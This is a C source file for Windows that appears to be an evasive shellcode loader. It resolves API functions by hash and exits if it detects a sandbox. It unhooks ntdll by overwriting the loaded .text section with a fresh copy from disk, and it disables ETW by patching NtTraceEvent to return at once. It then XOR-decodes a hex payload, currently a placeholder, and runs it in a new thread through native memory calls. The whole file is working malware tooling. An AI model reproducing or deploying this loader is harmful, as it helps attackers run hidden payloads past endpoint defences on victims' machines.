#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <stdbool.h>
#include "custom-functions.h"
#include "converter.h"
#include "dsh.h"
#include "sb-detector.h"

int WinMain(int argc, char* argv[]) {
	/*
		Insert required DLLs other than kernel32, ntdll, and kernelbase here
		if (LoadLibraryA("USER32.DLL") == NULL) {
			return 0;
		}
	*/

    // Get handle to NTDLL an kernel32
    HMODULE sysmod = fun002gmh(0x99225BE9);
	HMODULE mod = fun002gmh(0xCAF2D14E);
	fnfun008vp fun008vp = (fnfun008vp)fun001gpa(mod, 0x12BCF846);

	// Very basic sandbox check
	// Comment out if testing on a system with low resources
	int sbResult = sbDetector(sysmod);
	if (sbResult == 1) {
		return 1;
	}

	// Get process and module information
	fnfun010gcp fun010gcp = (fnfun010gcp)fun001gpa(mod, 0x12DCC689);
	HANDLE process = fun010gcp();
	MODULEINFO mi = { 0 };

	GetModuleInformation(process, sysmod, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

	// Get a handle to NTDLL
	fnfun004cf fun004cf = (fnfun004cf)fun001gpa(sysmod, 0x6B8272D5);
	HANDLE ntdllHandle;
	IO_STATUS_BLOCK ioStatusBlock;
	OBJECT_ATTRIBUTES objAttrs;
	UNICODE_STRING unicodeFileName;
	wchar_t* fileName = L"\\??\\C:\\Windows\\System32\\ntdll.dll";
	UNICODE_STRING us;
	us.Length = wcslen(fileName) * sizeof(wchar_t);
	us.MaximumLength = us.Length + sizeof(wchar_t);
	us.Buffer = fileName;
	InitializeObjectAttributes(&objAttrs, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
	NTSTATUS cfStatus = fun004cf(&ntdllHandle, GENERIC_READ, &objAttrs, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);

	// Create a file mapping of NTDLL
	fnfun005cfm fun005cfm = (fnfun005cfm)fun001gpa(mod, 0x5135913E);
	HANDLE ntdllMapping = fun005cfm(ntdllHandle, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	fnfun006mvf fun006mvf = (fnfun006mvf)fun001gpa(mod, 0x468AB0F4);
	LPVOID ntdllMappingAddress = fun006mvf(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	// Get the headers
	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	// Replace all sections with fresh sections
	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = fun008vp((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = fun008vp((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	sysmod = (HMODULE)ntdllMappingAddress;

	// Patching NtEventWrite
	DWORD dwOld = 0;
	FARPROC ptrNtTraceEvent = fun001gpa(sysmod, 0x60BB928A);
	fun008vp(ptrNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &dwOld);
	memcpy(ptrNtTraceEvent, "\xc3", 1); // ret;
	fun008vp(ptrNtTraceEvent, 1, dwOld, &dwOld);

	const char* hexString = "6368616e67656d65"; // Insert hex payload here (should be xored with key specified in key[])
	size_t pLen = strlen(hexString) / 2;
	const char key[] = "\x63\x68\x61\x6e\x67\x65\x6d\x65";

	unsigned char* result = (unsigned char*)malloc(pLen);
	convert(hexString, key, result);

	//LPVOID pAddress = VirtualAlloc(0, pLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	fnfun009avm fun009avm = (fnfun009avm)fun001gpa(sysmod, 0x111600CE);
	LPVOID pAddress = 0;

	fun009avm(fun010gcp(), &pAddress, 0, (PULONG64)&pLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		return 1;
	}

	fnfun011wvm fun011wvm = (fnfun011wvm)fun001gpa(sysmod, 0x851A3420);
	fun011wvm(fun010gcp(), pAddress, result, pLen, NULL);

	fnfun012pvm fun012pvm = (fnfun012pvm)fun001gpa(sysmod, 0x5C75B49C);
	ULONG oldProtect;
	fun012pvm(fun010gcp(), &pAddress, &pLen, PAGE_EXECUTE_READ, &oldProtect);

	fnfun013cte fun013cte = (fnfun013cte)fun001gpa(sysmod, 0x0226FBEF);
	HANDLE hThread = NULL;
	fun013cte(&hThread, THREAD_ALL_ACCESS, NULL, fun010gcp(), pAddress, NULL, 0, 0, 0, 0, NULL);
	if (hThread == NULL) {
		return 1;
	}

	fnfun014wfso fun014wfso = (fnfun014wfso)fun001gpa(sysmod, 0x516FF836);
	fnfun007ch fun007ch = (fnfun007ch)fun001gpa(sysmod, 0xB5CBB7D2);
	NTSTATUS status = fun014wfso(hThread, FALSE, NULL);
	if (status != 0) {
		fun007ch(hThread);
		return 1;
	}

	fun007ch(hThread);

	fnfun015fvm fun015fvm = (fnfun015fvm)fun001gpa(sysmod, 0x6BD1161F);
	fun015fvm(fun010gcp(), pAddress, 0, MEM_RELEASE);

	fun007ch(process);
	fun007ch(ntdllHandle);
	fun007ch(ntdllMapping);
	FreeLibrary(sysmod);

    return 0;
}
